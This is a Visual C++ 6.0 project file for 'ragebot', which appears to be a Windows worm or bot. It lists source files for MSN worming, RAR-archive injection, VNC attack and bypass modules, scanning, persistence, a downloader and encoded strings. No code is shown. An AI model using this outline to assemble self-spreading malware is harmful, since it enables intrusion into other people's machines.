# Microsoft Developer Studio Project File - Name="ragebot" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=ragebot - WIN32 RELEASE
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "ragebot.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "ragebot.mak" CFG="ragebot - WIN32 RELEASE"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "ragebot - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe
# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "obj"
# PROP BASE Intermediate_Dir "obj"
# PROP BASE Target_Dir "obj"
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "exe"
# PROP Intermediate_Dir "obj"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /W3 /GX /O1 /I "C:\Program Files\Microsoft SDK\Include" /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /machine:I386
# ADD LINK32 ws2_32.lib Shell32.lib advapi32.lib wininet.lib kernel32.lib User32.lib /nologo /subsystem:windows /machine:I386 /opt:nowin98
# SUBTRACT LINK32 /pdb:none
# Begin Target

# Name "ragebot - Win32 Release"
# Begin Group "SOURCES"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Group "exploit & scanning"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\DropFile.cpp
# End Source File
# Begin Source File

SOURCE=.\MSNWorm.cpp
# End Source File
# Begin Source File

SOURCE=.\patcher.cpp
# End Source File
# Begin Source File

SOURCE=.\peer2peer.cpp
# End Source File
# Begin Source File

SOURCE=".\rar-inject-add.cpp"
# End Source File
# Begin Source File

SOURCE=".\rar-inject.cpp"
# End Source File
# Begin Source File

SOURCE=.\scanner.cpp
# End Source File
# Begin Source File

SOURCE=".\vnc-rage.cpp"
# End Source File
# Begin Source File

SOURCE=.\vncabp.cpp
# End Source File
# End Group
# Begin Group "other shit"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\d3des.c
# End Source File
# Begin Source File

SOURCE=.\downloader.cpp
# End Source File
# Begin Source File

SOURCE=.\ftpd.cpp
# End Source File
# Begin Source File

SOURCE=.\main.cpp
# End Source File
# Begin Source File

SOURCE=.\md5.cpp
# End Source File
# Begin Source File

SOURCE=.\misc.cpp
# End Source File
# Begin Source File

SOURCE=.\Persist.cpp
# End Source File
# Begin Source File

SOURCE=".\string-gen.cpp"
# End Source File
# Begin Source File

SOURCE=.\version.c
# End Source File
# End Group
# End Group
# Begin Group "HEADERS"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Group "configuration"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\config.h
# End Source File
# End Group
# Begin Group "scanners & spreading"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\peer2peer.h
# End Source File
# Begin Source File

SOURCE=.\rfb.h
# End Source File
# Begin Source File

SOURCE=.\scanner.h
# End Source File
# Begin Source File

SOURCE=".\vnc-rage.h"
# End Source File
# Begin Source File

SOURCE=.\vncabp.h
# End Source File
# End Group
# Begin Group "others"

# PROP Default_Filter ""
# Begin Group "encoded"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\strings.h
# End Source File
# End Group
# Begin Source File

SOURCE=.\d3des.h
# End Source File
# Begin Source File

SOURCE=.\downloader.h
# End Source File
# Begin Source File

SOURCE=.\dropfile.h
# End Source File
# Begin Source File

SOURCE=.\externs.h
# End Source File
# Begin Source File

SOURCE=.\ftpd.h
# End Source File
# Begin Source File

SOURCE=.\include.h
# End Source File
# Begin Source File

SOURCE=.\main.h
# End Source File
# Begin Source File

SOURCE=.\md5.h
# End Source File
# Begin Source File

SOURCE=.\misc.h
# End Source File
# Begin Source File

SOURCE=.\msn.h
# End Source File
# Begin Source File

SOURCE=.\patcher.h
# End Source File
# Begin Source File

SOURCE=.\tcpip.h
# End Source File
# Begin Source File

SOURCE=.\version.h
# End Source File
# End Group
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter "ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe"
# End Group
# End Target
# End Project
